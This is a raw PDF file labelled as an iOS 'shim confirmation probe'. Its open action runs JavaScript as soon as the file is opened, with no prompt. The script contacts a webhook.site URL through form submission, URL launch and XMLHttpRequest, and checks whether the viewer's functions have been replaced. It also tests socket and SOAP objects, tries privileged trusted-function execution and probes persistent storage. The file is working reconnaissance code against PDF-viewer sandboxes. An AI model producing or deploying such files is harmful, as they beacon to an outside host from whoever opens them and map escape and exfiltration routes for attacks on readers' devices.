%PDF-1.7
% Shim Confirmation Probe - iOS - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      try {
        var results = [];

        // === 1. VERIFY SHIM BY CHECKING RETURN VALUES ===
        results.push("=== RETURN VALUES ===");
        try {
          var r1 = this.submitForm({
            cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=ret1",
            cSubmitAs: "HTML"
          });
          results.push("submitForm return: " + JSON.stringify(r1));
        } catch(e) { results.push("submitForm: " + e); }
        try {
          var r2 = app.launchURL("https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=ret2", true);
          results.push("launchURL return: " + JSON.stringify(r2));
        } catch(e) { results.push("launchURL: " + e); }

        // === 2. TEST IF FUNCTIONS ARE NATIVE OR REPLACED ===
        results.push("=== FUNCTION SOURCE ===");
        try { results.push("submitForm src: " + this.submitForm.toString().slice(0,80)); } catch(e) { results.push("submitForm src: " + e); }
        try { results.push("launchURL src: " + app.launchURL.toString().slice(0,80)); } catch(e) { results.push("launchURL src: " + e); }
        try { results.push("alert src: " + app.alert.toString().slice(0,80)); } catch(e) { results.push("alert src: " + e); }
        try { results.push("openDoc src: " + app.openDoc.toString().slice(0,80)); } catch(e) { results.push("openDoc src: " + e); }

        // === 3. ALTERNATIVE NETWORK METHODS ===
        results.push("=== ALT NETWORK ===");
        try {
          var x = new XMLHttpRequest();
          results.push("XHR constructor: ok");
          x.open("GET", "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=xhr", false);
          x.send();
          results.push("XHR send: " + x.status);
        } catch(e) { results.push("XHR: " + e); }
        try {
          var s = new Socket();
          results.push("Socket: available");
        } catch(e) { results.push("Socket: " + e); }
        try {
          results.push("Net: " + typeof Net);
        } catch(e) { results.push("Net: " + e); }
        try {
          results.push("SOAP: " + typeof SOAP);
        } catch(e) { results.push("SOAP: " + e); }

        // === 4. TRUSTED FUNCTION CORRECT SYNTAX ===
        results.push("=== TRUST EXEC ===");
        try {
          var myFunc = function() { return "inner exec ok"; };
          var trusted = app.trustedFunction(myFunc);
          results.push("wrap ok: " + typeof trusted);
          app.beginPriv();
          results.push("beginPriv: no throw");
          app.endPriv();
          results.push("endPriv: no throw");
        } catch(e) { results.push("trust exec: " + e); }

        // === 5. STORAGE / PERSISTENCE ===
        results.push("=== STORAGE ===");
        try {
          app.setTimeOut("app.alert('timeout fired')", 100);
          results.push("setTimeout: no throw");
        } catch(e) { results.push("setTimeout: " + e); }
        try {
          results.push("getPersistent: " + typeof app.getPersistent);
        } catch(e) { results.push("getPersistent: " + e); }
        try {
          var pv = app.getPersistent("testkey");
          results.push("getPersistent val: " + pv);
        } catch(e) { results.push("getPersistent call: " + e); }

        app.alert(results.join("\\n"));

      } catch(e) {
        app.alert("OUTER ERROR: " + e);
      }
   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Shim Confirm Probe) Tj ET
BT /F1 12 Tf 50 220 Td (Check alert output) Tj ET
endstream
endobj

